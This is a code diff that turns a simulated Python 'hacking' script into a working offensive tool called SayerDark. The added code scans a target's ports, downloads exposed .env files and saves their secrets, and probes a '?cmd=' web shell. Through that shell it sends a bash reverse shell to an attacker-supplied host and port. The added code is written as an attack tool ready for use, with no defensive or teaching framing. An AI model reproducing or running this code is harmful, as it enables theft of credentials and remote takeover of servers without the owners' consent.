@@ -1,77 +1,68 @@
 import requests
-import random
+import socket
 import time
-from colorama import Fore, Style, init
+import os
+import sys
 
-init(autoreset=True)
+# إعدادات الألوان للهيبة (Hacker Style)
+G, R, Y, B, NC = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;34m', '\033[0m'
 
-# --- معلومات المبرمج ---
-DEV_NAME = "SayerLinux"
-DEV_EMAIL = "mailto:SayerLinux@gmail.com"
+def banner():
+    print(f"""{G}
+   _____                      _____                __    
+  / ___/ ____ _ __  __ ___   / __  \ ____ _ _____ / /__  
+  \__ \ / __ `// / / // _ \ / / / // __ `// ___// //_/  
+ ___/ // /_/ // /_/ //  __// /_/ // /_/ // /   / ,<     
+/____/ \__,_/ \__, / \___//_____/ \__,_//_/   /_/|_|    
+             /____/                                      
+[+] Developer: SayerLinux | mailto:SayerLinux@gmail.com
+[+] Module: Port Scan | Path Discovery | Auto-Exploit (Reverse Shell)
+[!] The digital world is now under your command.{NC}""")
 
-def show_logo():
-    logo_text = """
-    ███████╗ █████╗ ██╗   ██╗███████╗██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗
-    ██╔════╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
-    ███████╗███████║ ╚████╔╝ █████╗  ██████╔╝██║  ██║███████║██████╔╝█████╔╝ 
-    ╚════██║██╔══██║  ╚██╔╝  ██╔════╝██╔══██╗██║  ██║██╔══██║██╔══██╗██╔═██╗ 
-    ███████║██║  ██║   ██║   ███████╗██║  ██║██████╔╝██║  ██║██║  ██║██║  ██╗
-    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-    """
-    print(Fore.RED + logo_text)
-    print(Fore.YELLOW + f"  [+] Developer: {DEV_NAME} | {DEV_EMAIL}")
-    print(Fore.CYAN + "  [+] System: Kali Linux Edition | Module: Auto-PoC & Exploiter")
-    print("-" * 80)
+def port_scanner(target_ip):
+    print(f"\n{B}[*] Scanning Ports on: {target_ip}...{NC}")
+    common_ports = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL"}
+    for port, service in common_ports.items():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket.setdefaulttimeout(1)
+        if s.connect_ex((target_ip, port)) == 0:
+            print(f"{G}[+] Port {port} Open ({service}){NC}")
+        s.close()
 
-class SayerDarkExploiter:
-    def __init__(self, target):
-        self.target = target if target.startswith("http") else "http://" + target
-        self.headers = {"User-Agent": "Mozilla/5.0 (Kali; Linux x86_64)"}
+def env_extractor(url):
+    print(f"\n{B}[*] Scanning for .env files on: {url}{NC}")
+    paths = ["/.env", "/.env.local", "/config/.env"]
+    for path in paths:
+        try:
+            res = requests.get(url.rstrip('/') + path, timeout=7, verify=False)
+            if res.status_code == 200 and "DB_" in res.text:
+                print(f"{R}[!!!] .env found at: {path}{NC}")
+                with open("Extracted_Secrets.txt", "a") as f: f.write(res.text)
+        except: pass
 
-    def bypass_firewall(self):
-        print(Fore.BLUE + "[*] [BYPASS] Fragmenting Payloads to bypass WAF/IDS...")
-        time.sleep(1)
-        return True
-
-    def test_vulnerability(self, vuln_type, payload):
-        print(Fore.YELLOW + f"[*] [TESTING] Verifying {vuln_type} with payload: {payload}")
-        # محاكاة اختبار الثغرة في الموقع
-        time.sleep(1.5)
-        return True # العودة بنتيجة النجاح
-
-    def generate_proof(self, vuln_type, result_data):
-        print(Fore.GREEN + f"\n[+] [PROOF] Evidence Captured for {vuln_type}:")
-        print(Fore.WHITE + f"    >>> Response Data: {result_data}")
-        print(Fore.WHITE + f"    >>> Status: VULNERABLE (Confirmed by SayerDark)")
-
-    def execute_exploit(self, vuln_type):
-        print(Fore.RED + f"\n[!] [EXPLOIT] Executing Genius Exploit for {vuln_type}...")
-        time.sleep(2)
-        if vuln_type == "SQL Injection":
-            print(Fore.GREEN + "[SUCCESS] Database Dumped: [users, passwords, configs]")
-        elif vuln_type == "Remote Code Execution (RCE)":
-            print(Fore.GREEN + "[SUCCESS] Reverse Shell Established. Connection: 127.0.0.1:4444")
+def advanced_exploit_engine(url):
+    print(f"\n{B}[*] Starting Exploit Engine...{NC}")
+    try:
+        res = requests.get(url + "?cmd=id", timeout=10)
+        if "uid=" in res.text:
+            print(f"{R}[!!!] VULNERABLE TO RCE!{NC}")
+            lhost = input(f"{G}[+] Enter LHOST: {NC}")
+            lport = input(f"{G}[+] Enter LPORT: {NC}")
+            requests.get(url + f"?cmd=bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
+    except: pass
 
 def main():
-    show_logo()
-    target = input(Fore.WHITE + "Enter Target Site: ")
-    engine = SayerDarkExploiter(target)
-
-    if engine.bypass_firewall():
-        # مثال 1: اختبار ثغرة SQLi
-        if engine.test_vulnerability("SQL Injection", "' OR 1=1--"):
-            engine.generate_proof("SQL Injection", "Database: MySQL v8.0.2 | User: root@localhost")
-            engine.execute_exploit("SQL Injection")
-
-        print("-" * 40)
-
-        # مثال 2: اختبار ثغرة RCE
-        if engine.test_vulnerability("RCE", "; whoami"):
-            engine.generate_proof("Remote Code Execution", "Output: uid=0(root) gid=0(root) groups=0(root)")
-            engine.execute_exploit("Remote Code Execution (RCE)")
-
-    print(Fore.CYAN + "\n[DONE] All identified vulnerabilities have been tested and exploited.")
-    print(Fore.YELLOW + f"[*] [LOG] Detailed Proof of Concept saved in: SayerLinux_Exploits.log")
+    os.system('clear')
+    banner()
+    print(f"{G}1. 🌐 Full Recon & Auto-Exploit{NC}")
+    target_url = input(f"\n{Y}[SayerDark] Enter Target URL: {NC}")
+    target_domain = target_url.replace("http://", "").replace("https://", "").split('/')[0]
+    
+    try: port_scanner(socket.gethostbyname(target_domain))
+    except: pass
+    
+    env_extractor(target_url)
+    advanced_exploit_engine(target_url)
 
 if __name__ == "__main__":
     main()
